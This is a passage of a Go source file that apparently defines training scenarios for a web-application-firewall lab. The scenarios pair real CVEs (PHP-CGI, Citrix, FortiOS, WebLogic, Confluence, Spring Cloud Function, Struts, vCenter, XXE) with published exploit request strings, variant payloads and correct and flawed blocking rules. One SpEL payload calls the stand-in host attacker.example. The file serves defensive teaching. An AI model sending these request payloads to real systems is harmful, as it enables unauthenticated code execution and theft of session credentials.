package scenario

import (
	"math/rand/v2"

	w "wafdy/internal/wafrule"
)

// ---------------------------------------------------------------------------
// Level 2: 勧告を WAF に翻訳する（文章の条件から、検査対象・変換・照合方法を選ぶ）
// ---------------------------------------------------------------------------

func registerLabLevel2() {
	lab(2, &Scenario{
		ID:    "lab-2-php-cgi",
		CVE:   "CVE-2024-4577",
		Title: T("PHP-CGI: ソフトハイフンが引数になる", "PHP-CGI: a soft hyphen becomes an argument"),
		Summary: T("Windows 上の PHP-CGI で、クエリ文字列から PHP の起動オプションを注入できる脆弱性。",
			"PHP-CGI on Windows lets attackers inject PHP startup options through the query string."),
		Topics: []Text{T("攻撃の本質を見抜く", "Finding the essence of an attack"), T("URL decode と Lowercase", "URL decode and Lowercase")},
		Briefing: []Text{
			T("日本語などのロケールの Windows で動く PHP-CGI は、文字コード変換の際にソフトハイフン (0xAD) を半角のハイフンとして扱います。そのため、クエリ文字列に %AD を入れると PHP の起動オプション (-d) を注入できてしまいます。",
				"PHP-CGI running on Windows with locales such as Japanese converts the soft hyphen (0xAD) into an ASCII hyphen. As a result, putting %AD in the query string lets attackers inject PHP startup options (-d)."),
			T("公開された PoC: POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input (Body に PHP のコード)",
				"Published PoC: POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input (with PHP code in the body)"),
		},
		Conditions: []Text{
			T("攻撃者は -d オプションで PHP の設定 allow_url_include と auto_prepend_file を書き換え、Body のコードを実行させます。",
				"The attacker uses -d to rewrite the PHP settings allow_url_include and auto_prepend_file so that the code in the body runs."),
			T("これらの設定名がサイトのクエリ文字列に現れることは、通常ありません。",
				"These setting names never normally appear in your site's query strings."),
		},
		Hints: []Text{
			T("%AD は攻撃の「入り口」にすぎず、普通のハイフン (-d) でも同じ攻撃ができる環境があります。変わらないのは書き換える設定名のほうです。",
				"%AD is just the way in; in some environments a plain hyphen (-d) works too. What doesn't change is the names of the settings being rewritten."),
			T("設定名の一部を URL エンコードした亜種があります (%61llow_url_include など)。",
				"Some variants URL-encode part of the setting name (e.g. %61llow_url_include)."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (%AD)", "The PoC as published (%AD)"), 10, func(r *rand.Rand) Request {
				req := withBody(atk(r, post(r, "/index.php", "")), "application/x-www-form-urlencoded", "<?php echo 'wafdojo-test'; ?>")
				req.RawQuery = "%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
				return req
			}},
			{Attack, T("普通のハイフン (-d)", "Plain hyphen (-d)"), 10, func(r *rand.Rand) Request {
				req := withBody(atk(r, post(r, "/index.php", "")), "application/x-www-form-urlencoded", "<?php echo 'wafdojo-test'; ?>")
				req.RawQuery = "-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
				return req
			}},
			{Attack, T("設定名を大文字で", "Setting names in uppercase"), 10, func(r *rand.Rand) Request {
				req := withBody(atk(r, post(r, "/index.php", "")), "application/x-www-form-urlencoded", "<?php echo 'wafdojo-test'; ?>")
				req.RawQuery = "%ADd+ALLOW_URL_INCLUDE%3d1+%ADd+AUTO_PREPEND_FILE%3dphp://input"
				return req
			}},
			{Attack, T("設定名の一部をエンコード", "Part of the setting name encoded"), 10, func(r *rand.Rand) Request {
				req := withBody(atk(r, post(r, "/index.php", "")), "application/x-www-form-urlencoded", "<?php echo 'wafdojo-test'; ?>")
				req.RawQuery = "%ADd+%61llow_url_include%3d1+%ADd+%61uto_prepend_file%3dphp://input"
				return req
			}},
			{Benign, T("PHP サイトの正規のページ", "Legitimate pages of the PHP site"), 25, func(r *rand.Rand) Request {
				return get(r, "/index.php", pick(r, []string{"page=docs&include=header", "q=auto+prepend+file", "lang=ja&url=%2Fhome", "id=10&mode=-d"}))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-php-cgi-args", w.Or(
			w.Contains("allow_url_include", w.QueryString(), w.URLDecode, w.Lowercase),
			w.Contains("auto_prepend_file", w.QueryString(), w.URLDecode, w.Lowercase),
		)),
		SolutionNote: []Text{
			T("PoC の %AD という目立つ部分ではなく、攻撃に欠かせない「書き換える設定名」をとらえます。",
				"Target what the attack can't do without — the names of the settings being rewritten — rather than the eye-catching %AD in the PoC."),
			T("URL decode で %61 などのエンコードを戻し、Lowercase で大文字を吸収します。auto prepend file のように単語が離れた検索は止まりません。",
				"URL decode undoes encodings such as %61, and Lowercase absorbs uppercase. Searches with separated words, like \"auto prepend file\", are not blocked."),
		},
		Pitfall: w.Block("pitfall-php-cgi", w.Contains("%ADd", w.QueryString())),
		PitfallNote: []Text{
			T("PoC に出てくる %ADd をそのまま探すルールです。普通のハイフンを使う亜種、小文字の %add、設定名を工夫した亜種のどれも止められません。",
				"This rule searches for the %ADd from the PoC verbatim. It misses the plain-hyphen variant, lowercase %add, and the variants that disguise the setting names."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-citrix-traversal",
		CVE:   "CVE-2019-19781",
		Title: T("Citrix ADC: /vpn/../vpns/ の抜け道", "Citrix ADC: the /vpn/../vpns/ shortcut"),
		Summary: T("Citrix ADC / Gateway で、ディレクトリを遡ることで認証前に管理用スクリプトへ到達できる脆弱性。",
			"Citrix ADC / Gateway lets unauthenticated users reach administrative scripts by climbing directories."),
		Topics: []Text{T("NORMALIZE_PATH", "NORMALIZE_PATH"), T("AND で条件を重ねる", "Stacking conditions with AND")},
		Briefing: []Text{
			T("Citrix ADC では、/vpns/ の下のスクリプトはログインしたユーザーしか使えないはずでした。ところが /vpn/../vpns/ のように、いったん別のディレクトリに入ってから遡ると、ログインせずにたどり着けてしまう脆弱性が見つかりました。",
				"In Citrix ADC, scripts under /vpns/ were supposed to be usable only by logged-in users. But going into another directory and climbing back, as in /vpn/../vpns/, reaches them without logging in."),
		},
		Conditions: []Text{
			T("ログイン済みのユーザーは /vpns/ の下を直接 (遡りなしで) 使います。これは止めないでください。",
				"Logged-in users access /vpns/ directly (without climbing). Don't block them."),
			T("止めたいのは「ディレクトリを遡って /vpns/ にたどり着く」リクエストです。遡りは %2e%2e のようにエンコードされることもあります。",
				"What you want to stop is requests that reach /vpns/ by climbing directories. The climb may be encoded, as in %2e%2e."),
		},
		Hints: []Text{
			T("テキスト変換 NORMALIZE_PATH はパスの ../ を解決します。/vpn/../vpns/x は /vpns/x になります。",
				"The NORMALIZE_PATH text transformation resolves ../ in paths: /vpn/../vpns/x becomes /vpns/x."),
			T("「正規化すると /vpns/ を含む」AND「デコードすると ../ を含む」の 2 つを組み合わせましょう。",
				"Combine \"contains /vpns/ after normalization\" AND \"contains ../ after decoding\"."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま (/vpn/../vpns/)", "The PoC as published (/vpn/../vpns/)"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/vpn/../vpns/portal/scripts/newbm.pl", form("url", "http://example.com", "title", "wafdojo", "desc", "test")))
			}},
			{Attack, T("遡りをエンコード (%2e%2e)", "Encoded climb (%2e%2e)"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/vpn/%2e%2e/vpns/cfg/smb.conf", ""))
			}},
			{Attack, T("大文字のパス", "Uppercase path"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/VPN/../VPNS/portal/scripts/rmbm.pl", ""))
			}},
			{Benign, T("ログイン済みユーザーの /vpns/ 利用", "Logged-in users using /vpns/"), 20, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/vpns/portal/home.html", "/vpns/portal/scripts/newbm.pl", "/vpns/services.html"}), "")
			}},
			{Benign, T("ログイン画面", "The login page"), 15, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/vpn/index.html", "/vpn/js/gateway_login_view.js"}), "")
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-citrix-traversal", w.And(
			w.Contains("/vpns/", w.UriPath(), w.URLDecode, w.NormalizePath, w.Lowercase),
			w.Contains("../", w.UriPath(), w.URLDecode),
		)),
		SolutionNote: []Text{
			T("1 つ目の条件は「最終的に /vpns/ に行き着く」、2 つ目は「途中で遡っている」を表します。両方を満たすものだけが攻撃です。",
				"The first condition means \"ends up under /vpns/\" and the second means \"climbs along the way\". Only requests meeting both are attacks."),
			T("../ を含むものをすべて止めるルールでもこの問題の攻撃は止まりますが、どこに到達しようとしているかまで書くと、ルールの意図が後から読んでもわかります。",
				"A rule blocking every ../ would also stop these attacks, but stating where the request is trying to go makes the rule's intent clear to whoever reads it later."),
		},
		Pitfall: w.Block("pitfall-citrix", w.StartsWith("/vpns/", w.UriPath(), w.Lowercase)),
		PitfallNote: []Text{
			T("「/vpns/ へのアクセスを止める」をそのまま書いたルールです。攻撃のパスは /vpn/ で始まるのですり抜け、ログイン済みユーザーの正規の利用だけを止めてしまいます。",
				"This rule literally implements \"block access to /vpns/\". Attack paths start with /vpn/ and slip through, while legitimate use by logged-in users gets blocked."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-fortios-lang",
		CVE:   "CVE-2018-13379",
		Title: T("FortiOS SSL-VPN: lang パラメータでファイルを読む", "FortiOS SSL-VPN: reading files via the lang parameter"),
		Summary: T("SSL-VPN の言語ファイルを返す機能で、パスを指定してセッション情報を読み出せる脆弱性。",
			"The SSL-VPN's language file endpoint lets attackers specify a path and read session data."),
		Topics: []Text{T("特定のクエリパラメータだけを検査", "Inspecting a single query parameter")},
		Briefing: []Text{
			T("FortiOS の SSL-VPN で、言語ファイルを返す /remote/fgt_lang?lang= の lang にパスを指定すると、VPN のセッションファイル (ユーザー名とパスワードを含む) を読み出せる脆弱性が見つかりました。",
				"In FortiOS SSL-VPN, specifying a path in the lang parameter of /remote/fgt_lang?lang=, which returns language files, lets attackers read the VPN session file (containing user names and passwords)."),
			T("公開された PoC: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
				"Published PoC: /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"),
		},
		Conditions: []Text{
			T("lang パラメータの正規の値は、ja・en などの言語名だけです。lang に ../ が含まれるリクエストを止めてください。",
				"Legitimate values of the lang parameter are just language names such as ja and en. Block requests whose lang contains ../."),
			T("ログイン画面には next というパラメータがあり、ここには ../help のような相対パスが入ることがあります。これは正常です。",
				"The login page has a parameter called next, which may contain relative paths like ../help. That is normal."),
		},
		Hints: []Text{
			T("Query string 全体ではなく、Single query parameter で lang だけを検査しましょう。",
				"Inspect only lang with Single query parameter, rather than the whole query string."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 12, func(r *rand.Rand) Request {
				req := atk(r, get(r, "/remote/fgt_lang", ""))
				req.RawQuery = "lang=/../../../..//////////dev/cmdb/sslvpn_websession"
				return req
			}},
			{Attack, T("スラッシュをエンコード", "Encoded slashes"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/remote/fgt_lang", "lang=%2f..%2f..%2f..%2fdev%2fcmdb%2fsslvpn_websession"))
			}},
			{Attack, T("ドットもエンコード", "Encoded dots too"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/remote/fgt_lang", "lang=%2F%2E%2E%2F%2E%2E%2Fdev%2Fcmdb%2Fsslvpn_websession"))
			}},
			{Benign, T("言語ファイルの取得", "Fetching language files"), 20, func(r *rand.Rand) Request {
				return get(r, "/remote/fgt_lang", q("lang", pick(r, []string{"ja", "en", "zh-cn"})))
			}},
			{Benign, T("相対パスを含むログイン画面", "Login page with a relative next path"), 15, func(r *rand.Rand) Request {
				return get(r, "/remote/login", "lang=en&next=..%2Fhelp")
			}},
			{Benign, lblBrowse, 15, browse},
		},
		Solution: w.Block("block-fortios-lang", w.Contains("../", w.QueryArg("lang"), w.URLDecode)),
		SolutionNote: []Text{
			T("Single query parameter で lang だけを見るので、ほかのパラメータ (next) に ../ が入っていても止まりません。",
				"Because only lang is inspected with Single query parameter, ../ in other parameters (next) doesn't trigger the rule."),
			T("URL decode をかけると、%2f..%2f や %2E%2E%2F のようなエンコードされた形も ../ として見つけられます。",
				"With URL decode, encoded forms like %2f..%2f and %2E%2E%2F are also found as ../."),
		},
		Pitfall: w.Block("pitfall-fortios", w.Contains("../", w.QueryString(), w.URLDecode)),
		PitfallNote: []Text{
			T("クエリ文字列全体を検査するルールです。攻撃は止まりますが、ログイン画面の next=../help まで止めてしまいます。",
				"This rule inspects the whole query string. It stops the attacks but also blocks next=../help on the login page."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-weblogic-console",
		CVE:   "CVE-2020-14882",
		Title: T("WebLogic: 静的ファイルのパスから管理コンソールへ", "WebLogic: from a static file path to the admin console"),
		Summary: T("Oracle WebLogic Server の管理コンソールに、二重エンコードしたパスで認証なしで入れる脆弱性。",
			"A double-encoded path gets unauthenticated users into the Oracle WebLogic Server admin console."),
		Topics: []Text{T("二重エンコード", "Double encoding"), T("エンコードの表記ゆれ", "Variations in encoding")},
		Briefing: []Text{
			T("WebLogic の管理コンソール /console/ では、CSS や画像のパス (/console/css/ など) はログインなしで読めます。ここに二重エンコードした ../ を付けて console.portal を指定すると、ログインせずに管理画面を開けてしまう脆弱性が見つかりました。",
				"In WebLogic's admin console /console/, CSS and image paths (such as /console/css/) are readable without logging in. Appending a double-encoded ../ and pointing at console.portal opens the admin console without logging in."),
			T("公開された PoC: /console/css/%252e%252e%252fconsole.portal",
				"Published PoC: /console/css/%252e%252e%252fconsole.portal"),
		},
		Conditions: []Text{
			T("攻撃は二重エンコードした ../ を使います。デコードの回数とエンコードの書き方の違いに注意してください。",
				"The attack uses a double-encoded ../. Watch out for the number of decodes and for different ways of writing the encoding."),
			T("/console/css/ や /console/images/ の下にある本物の CSS や画像は、ログイン画面の表示に必要です。",
				"The real CSS and images under /console/css/ and /console/images/ are needed to render the login page."),
		},
		Hints: []Text{
			T("%252e は 1 回デコードすると %2e、もう 1 回で . になります。",
				"%252e becomes %2e after one decode and . after another."),
			T("%25%32%65 のように、% 以外の文字までエンコードした書き方もあります。これも 2 回デコードすると . になります。",
				"Some variants encode more than the %, like %25%32%65. Decoding twice also turns that into a dot."),
		},
		Patterns: []Pattern{
			{Attack, T("PoC そのまま", "The PoC as published"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/console/css/%252e%252e%252fconsole.portal", ""))
			}},
			{Attack, T("大文字のエンコード", "Uppercase encoding"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/console/images/%252E%252E%252Fconsole.portal", ""))
			}},
			{Attack, T("数字と文字までエンコード", "Digits and letters encoded too"), 12, func(r *rand.Rand) Request {
				return atk(r, get(r, "/console/css/%25%32%65%25%32%65%25%32%66console.portal", ""))
			}},
			{Benign, T("ログイン画面と静的ファイル", "Login page and static files"), 25, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/console/login/LoginForm.jsp", "/console/css/login.css", "/console/images/logo.png", "/console/css/%E6%97%A5%E6%9C%AC%E8%AA%9E.css"}), "")
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-weblogic-console", w.Contains("../", w.UriPath(), w.URLDecode, w.URLDecode)),
		SolutionNote: []Text{
			T("URL decode を 2 回かけると、どの書き方でも ../ という同じ形にそろいます。「デコードしてから比べる」のが、エンコードの表記ゆれへの基本の対策です。",
				"Decoding twice turns every variant into the same ../. \"Decode first, then compare\" is the basic defense against encoding variations."),
		},
		Pitfall: w.Block("pitfall-weblogic", w.Contains("%252e%252e%252f", w.UriPath(), w.Lowercase)),
		PitfallNote: []Text{
			T("PoC のエンコードされた文字列をそのまま探すルールです。Lowercase で大文字の %252E には対応できますが、%25%32%65 のような別の書き方はすり抜けます。",
				"This rule looks for the PoC's encoded string verbatim. Lowercase handles the uppercase %252E, but other spellings like %25%32%65 slip through."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-confluence-setup",
		CVE:   "CVE-2023-22515",
		Title: T("Confluence: セットアップをやり直させる", "Confluence: forcing setup to run again"),
		Summary: T("Confluence のセットアップ完了フラグを外部から書き換え、管理者アカウントを新しく作れる脆弱性。",
			"Attackers can flip Confluence's setup-complete flag from outside and create a new administrator account."),
		Topics: []Text{T("複数の攻撃段階を止める", "Stopping multiple attack stages"), T("OR", "OR")},
		Briefing: []Text{
			T("Confluence Data Center / Server で、/server-info.action などに bootstrapStatusProvider.applicationConfig.setupComplete=false を付けると、セットアップ完了のフラグを書き換えられる脆弱性が見つかりました。",
				"In Confluence Data Center / Server, appending bootstrapStatusProvider.applicationConfig.setupComplete=false to endpoints such as /server-info.action flips the setup-complete flag."),
			T("攻撃者はそのあと、セットアップ用の画面 /setup/setupadministrator.action から管理者アカウントを作ります。",
				"The attacker then creates an administrator account from the setup page /setup/setupadministrator.action."),
		},
		Conditions: []Text{
			T("フラグを書き換える段階と、管理者を作る段階のどちらも止めてください。",
				"Stop both the stage that flips the flag and the stage that creates the administrator."),
			T("bootstrapStatusProvider というパラメータを外部から使うことはありません。セットアップ済みのサイトでは /setup/ の下にもアクセスしません。",
				"The bootstrapStatusProvider parameter is never used from outside, and an already set-up site never needs anything under /setup/."),
			T("ヘルプページの /setup-guide/ は正規のページです。",
				"The help page /setup-guide/ is a legitimate page."),
		},
		Hints: []Text{
			T("パラメータ名の . を %2E にエンコードした亜種があります。",
				"Some variants encode the dots in the parameter name as %2E."),
			T("/setup/ と /setup-guide/ を区別するには、末尾のスラッシュまで含めて前方一致させます。",
				"To tell /setup/ apart from /setup-guide/, include the trailing slash in a prefix match."),
		},
		Patterns: []Pattern{
			{Attack, T("フラグの書き換え (PoC)", "Flipping the flag (PoC)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/server-info.action", "bootstrapStatusProvider.applicationConfig.setupComplete=false"))
			}},
			{Attack, T("フラグの書き換え (0 を指定)", "Flipping the flag (with 0)"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/server-info.action", "bootstrapStatusProvider.applicationConfig.setupComplete=0"))
			}},
			{Attack, T("パラメータ名をエンコード", "Encoded parameter name"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/server-info.action", "bootstrapStatusProvider%2EapplicationConfig%2EsetupComplete=false"))
			}},
			{Attack, T("管理者アカウントの作成", "Creating the administrator account"), 10, func(r *rand.Rand) Request {
				return atk(r, post(r, "/setup/setupadministrator.action", form("username", "wafdojoadmin", "fullName", "wafdojo", "email", "wafdojo@example.com", "password", "wafdojo-test", "confirm", "wafdojo-test")))
			}},
			{Benign, T("Confluence の通常の利用", "Normal Confluence use"), 25, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/server-info.action", "/setup-guide/index.html", "/pages/viewpage.action", "/rest/api/content"}), pick(r, []string{"", "pageId=123456", "status=current"}))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-confluence-setup", w.Or(
			w.Contains("bootstrapstatusprovider", w.QueryString(), w.URLDecode, w.Lowercase),
			w.StartsWith("/setup/", w.UriPath(), w.Lowercase),
		)),
		SolutionNote: []Text{
			T("1 つ目の条件でフラグの書き換えを、2 つ目の条件で管理者の作成を止めます。片方が破られても、もう片方で止まるようにする考え方です。",
				"The first condition stops the flag flip and the second stops the admin creation. If one layer is bypassed, the other still holds."),
			T("値 (false / 0) ではなくパラメータ名でとらえるので、値を変えた亜種にも対応できます。",
				"Matching on the parameter name rather than the value (false / 0) also covers variants with different values."),
		},
		Pitfall: w.Block("pitfall-confluence-setup", w.Contains("setupComplete=false", w.QueryString())),
		PitfallNote: []Text{
			T("PoC の文字列を探すルールです。値を 0 にした亜種と、管理者アカウントの作成を止められません。",
				"This rule looks for the PoC string. It misses the variant using 0 and doesn't stop the administrator creation."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-spring-cloud-function",
		CVE:   "CVE-2022-22963",
		Title: T("Spring Cloud Function: ルーティング用ヘッダーの SpEL", "Spring Cloud Function: SpEL in the routing header"),
		Summary: T("ルーティング用のヘッダーに書いた SpEL 式が評価され、任意のコードを実行される脆弱性。",
			"SpEL expressions written in the routing header are evaluated, allowing arbitrary code execution."),
		Topics: []Text{T("ヘッダーの有無", "Header presence"), T("似た名前のヘッダーとの区別", "Telling similar headers apart")},
		Briefing: []Text{
			T("Spring Cloud Function の RoutingFunction は、spring.cloud.function.routing-expression ヘッダーに書かれた SpEL 式を評価して、呼び出す関数を決めます。この式で任意の Java コードを実行できる脆弱性が見つかりました。",
				"Spring Cloud Function's RoutingFunction evaluates the SpEL expression in the spring.cloud.function.routing-expression header to decide which function to call. That expression can run arbitrary Java code."),
		},
		Conditions: []Text{
			T("あなたのサービスでは routing-expression ヘッダーを使っていません。付いているリクエストは値に関係なく止めてください。",
				"Your service doesn't use the routing-expression header. Block any request that carries it, whatever its value."),
			T("ただし、呼び出す関数を名前で指定する spring.cloud.function.definition ヘッダーは、正規のクライアントが使っています。",
				"However, legitimate clients use the spring.cloud.function.definition header, which names the function to call."),
		},
		Patterns: []Pattern{
			{Attack, T("SpEL でプロパティを読む", "Reading a property via SpEL"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, post(r, "/functionRouter", "data")), "spring.cloud.function.routing-expression", `T(java.lang.System).getProperty("user.name")`)
			}},
			{Attack, T("SpEL で外部に接続", "Reaching out via SpEL"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, post(r, "/functionRouter", "data")), "spring.cloud.function.routing-expression", `new java.net.URL("http://attacker.example/").openStream()`)
			}},
			{Attack, T("ヘッダー名を大文字で", "Header name in uppercase"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, post(r, "/functionRouter", "data")), "Spring.Cloud.Function.Routing-Expression", `T(java.lang.Runtime)`)
			}},
			{Benign, T("関数を名前で呼ぶ正規のクライアント", "Legitimate clients calling functions by name"), 25, func(r *rand.Rand) Request {
				return withHeader(post(r, "/functionRouter", "data"), "spring.cloud.function.definition", pick(r, []string{"uppercase", "reverse", "uppercase|reverse"}))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-scf-routing-expression", w.Present(w.Header("spring.cloud.function.routing-expression"))),
		SolutionNote: []Text{
			T("ヘッダー名を完全に指定して、そのヘッダーが付いているか (サイズが 0 より大きいか) だけを見ます。SpEL の書き方は無数にあるので、値を調べるより確実です。",
				"Name the header exactly and only check whether it's present (size greater than 0). There are endless ways to write SpEL, so this is more reliable than inspecting the value."),
		},
		Pitfall: w.Block("pitfall-scf", w.Contains("spring.cloud.function", w.AllHeaderKeys(), w.Lowercase)),
		PitfallNote: []Text{
			T("spring.cloud.function で始まるヘッダーをまとめて止めるルールです。攻撃は止まりますが、正規の spring.cloud.function.definition まで止めてしまいます。",
				"This rule blocks every header starting with spring.cloud.function. It stops the attacks but also blocks the legitimate spring.cloud.function.definition."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-struts-content-type",
		CVE:   "CVE-2017-5638",
		Title: T("Apache Struts 2: Content-Type に書かれた OGNL", "Apache Struts 2: OGNL in the Content-Type"),
		Summary: T("ファイルアップロードの処理が Content-Type ヘッダーの OGNL 式を評価してしまう脆弱性 (S2-045)。",
			"The file upload handler evaluates OGNL expressions in the Content-Type header (S2-045)."),
		Topics: []Text{T("特定のヘッダーの正規表現", "Regex on a specific header")},
		Briefing: []Text{
			T("Apache Struts 2 の Jakarta Multipart パーサーは、Content-Type ヘッダーが不正なときのエラーメッセージに含まれる OGNL 式を評価してしまいます。大規模な情報漏えい事件の原因にもなった脆弱性です (S2-045)。",
				"Apache Struts 2's Jakarta Multipart parser evaluates OGNL expressions contained in the error message produced for an invalid Content-Type header. This flaw was behind a major data breach (S2-045)."),
		},
		Conditions: []Text{
			T("OGNL 式は %{ ... } または ${ ... } の形で Content-Type ヘッダーに入ります。",
				"The OGNL expression goes into the Content-Type header in the form %{ ... } or ${ ... }."),
			T("正規の Content-Type には、multipart/form-data; boundary=... のように記号を含むものがあります。",
				"Legitimate Content-Type values include symbols too, as in multipart/form-data; boundary=...."),
		},
		Patterns: []Pattern{
			{Attack, T("%{ で始まる OGNL", "OGNL starting with %{"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, post(r, "/upload.action", "x")), "Content-Type", `%{(#wafdojo='multipart/form-data').(#context)}`)
			}},
			{Attack, T("${ で始まる OGNL", "OGNL starting with ${"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, post(r, "/upload.action", "x")), "Content-Type", `${(#wafdojo='multipart/form-data')}`)
			}},
			{Attack, T("boundary に OGNL", "OGNL in the boundary"), 12, func(r *rand.Rand) Request {
				return withHeader(atk(r, post(r, "/upload.action", "x")), "Content-Type", `multipart/form-data; boundary=%{(#wafdojo=1)}`)
			}},
			{Benign, T("正規のファイルアップロード", "Legitimate file uploads"), 25, func(r *rand.Rand) Request {
				return withHeader(post(r, "/upload.action", "x"), "Content-Type", pick(r, []string{
					"multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
					"application/x-www-form-urlencoded; charset=UTF-8",
					"multipart/form-data; boundary=--{wafdojo}--",
				}))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-struts-ognl", w.Regex(`[%$]\{`, w.Header("content-type"))),
		SolutionNote: []Text{
			T("正規表現の [%$] は「% か $ のどちらか 1 文字」を表します。そのあとに \\{ を続けて、%{ と ${ を 1 つのルールでとらえます。",
				"In regex, [%$] means \"one character that is % or $\". Following it with \\{ catches both %{ and ${ in one rule."),
			T("{ だけで判定すると、boundary=--{wafdojo}-- のような正規の Content-Type まで止めてしまいます。",
				"Matching on { alone would also block legitimate values such as boundary=--{wafdojo}--."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-vcenter-plugin",
		CVE:   "CVE-2021-21972",
		Title: T("vCenter Server: 使っていないプラグインの入口", "vCenter Server: the door of an unused plugin"),
		Summary: T("vCenter Server の vROps プラグインが、認証なしでファイルのアップロードを受け付ける脆弱性。",
			"vCenter Server's vROps plugin accepts file uploads without authentication."),
		Topics: []Text{T("NORMALIZE_PATH", "NORMALIZE_PATH"), T("パスの表記ゆれ", "Path variations")},
		Briefing: []Text{
			T("vCenter Server の vRealize Operations (vROps) プラグインの /ui/vropspluginui/rest/services/ 以下が、認証なしでファイルのアップロードを受け付け、任意のコードを実行される脆弱性が見つかりました。",
				"Endpoints under /ui/vropspluginui/rest/services/ in vCenter Server's vRealize Operations (vROps) plugin accept file uploads without authentication, leading to arbitrary code execution."),
		},
		Conditions: []Text{
			T("あなたの環境では vROps プラグインを使っていません。/ui/vropspluginui/ の下へのアクセスはすべて止めてください。",
				"Your environment doesn't use the vROps plugin. Block all access under /ui/vropspluginui/."),
			T("攻撃者は // や /./ を混ぜたパスでも試してきます。サーバーはこれらを同じパスとして扱います。",
				"Attackers also try paths with // or /./ mixed in, which the server treats as the same path."),
		},
		Patterns: []Pattern{
			{Attack, T("ファイルのアップロード (PoC)", "File upload (PoC)"), 10, func(r *rand.Rand) Request {
				return atk(r, withBody(post(r, "/ui/vropspluginui/rest/services/uploadova", ""), "multipart/form-data; boundary=wafdojo", "--wafdojo\r\nContent-Disposition: form-data; name=\"uploadFile\"; filename=\"wafdojo.tar\"\r\n\r\nwafdojo-test\r\n--wafdojo--\r\n"))
			}},
			{Attack, T("状態確認 API", "Status API"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/ui/vropspluginui/rest/services/getstatus", ""))
			}},
			{Attack, T("スラッシュを重ねたパス", "Path with doubled slashes"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/ui//vropspluginui/rest/services/getstatus", ""))
			}},
			{Attack, T("/./ を混ぜたパス", "Path with /./"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/ui/./vropspluginui/rest/services/uploadova", ""))
			}},
			{Benign, T("vSphere Client の通常の画面", "Regular vSphere Client pages"), 25, func(r *rand.Rand) Request {
				return get(r, pick(r, []string{"/ui/", "/ui/app/vm/list", "/ui/vropsplugin-docs/index.html", "/ui/config/settings.json"}), "")
			}},
			{Benign, lblBrowse, 20, browse},
		},
		Solution: w.Block("block-vcenter-vrops", w.StartsWith("/ui/vropspluginui/", w.UriPath(), w.NormalizePath, w.Lowercase)),
		SolutionNote: []Text{
			T("NORMALIZE_PATH は連続するスラッシュや /./ を取り除くので、表記の違うパスも /ui/vropspluginui/... という同じ形になります。",
				"NORMALIZE_PATH removes repeated slashes and /./, so differently written paths all become /ui/vropspluginui/...."),
			T("末尾のスラッシュまで含めて前方一致させると、/ui/vropsplugin-docs/ のような別のページは止まりません。",
				"Including the trailing slash in the prefix match leaves other pages such as /ui/vropsplugin-docs/ alone."),
		},
		Pitfall: w.Block("pitfall-vcenter", w.StartsWith("/ui/vropspluginui/", w.UriPath())),
		PitfallNote: []Text{
			T("正規化をしないルールです。/ui//vropspluginui/ や /ui/./vropspluginui/ のように書き方を変えた攻撃がすり抜けます。",
				"This rule doesn't normalize. Attacks written as /ui//vropspluginui/ or /ui/./vropspluginui/ slip through."),
		},
	})

	lab(2, &Scenario{
		ID:    "lab-2-xxe",
		CVE:   "CWE-611",
		Title: T("XXE: XML の外部実体参照でファイルを読む", "XXE: reading files via XML external entities"),
		Summary: T("XML を受け付ける API で、外部実体参照を使ってサーバー内のファイルを読まれる脆弱性。",
			"An XML-accepting API lets attackers read server files through external entity references."),
		Topics: []Text{T("Body の検査", "Inspecting the body"), T("誤検知を避ける", "Avoiding false positives")},
		Briefing: []Text{
			T("取引先から注文データを受け取る POST /api/import が、XML の外部実体参照 (<!ENTITY x SYSTEM \"file:///...\">) を処理してしまい、サーバーのファイルを読み出せることがわかりました (XXE)。",
